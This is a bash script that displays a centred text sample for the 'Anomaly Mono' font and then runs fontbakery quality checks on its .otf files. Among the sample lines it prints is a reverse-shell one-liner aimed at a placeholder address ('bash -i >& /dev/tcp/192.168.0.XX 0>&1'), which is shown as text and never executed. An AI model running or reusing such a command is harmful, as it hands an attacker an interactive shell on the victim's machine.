#!/bin/bash

bold=$(tput bold)
red='\033[0;31m'
green='\033[0;32m'
ltcyan='\033[0;96m'
normal=$(tput sgr0)
nc='\033[0m'


RESULT=0
SUMMARY=""
BREAK="========================================="

function runDemo () {
    clear
    echo ""
    read -r -d '' DEMO_STRING << EOM
Anomaly Mono

ABCDEFGHIJKLMNOPQRSTUVWXYZ
abcdefghijklmnopqrstuvwxyz
012346789
!@#$%^&*()_+-={|}
[/]~:;"'<>.,?/

public static void main(String[] args) { }
function square(n) { return n * n; }
sum = lambda x, y : x + y
(x ^= y), (y ^= x), (x ^= y);
bash -i >& /dev/tcp/192.168.0.XX 0>&1
379965d428a042f18113f3c2ff7f0e15

___
EOM

    columns="$(tput cols)"
    while read -r line; do
        printf "%*s\n" $(( (${#line} + columns) / 2)) "$line"
    done <<< "$DEMO_STRING"
}

function runFontBakery () {
    echo -e "${ltcyan}Running $1...${nc}"
    sleep 1
    fontbakery $1 *.otf
    case "$?" in
        0)
            SUMMARY+="$1: ${green}${bold}PASSED${normal}${nc}\n"
            ;;
        1)
            SUMMARY+="$1: ${red}${bold}FAILED${normal}${nc}\n"
            RESULT=1
            ;;
    esac
}

if ! [[ -x "$(command -v fontbakery)" ]]; then
    echo -e "\n${red}${bold}Please install fontbakery before running this script.${normal}${nc}\n\nYou can view how to do so here: https://font-bakery.readthedocs.io/en/latest/user/installation/index.html"
    exit 1
fi

runDemo
runFontBakery "check-googlefonts"
runFontBakery "check-adobefonts"
runFontBakery "check-fontval"

echo -e "$BREAK\n"
echo -e "Summary:\n$SUMMARY"
echo -e "$BREAK"
exit $RESULT
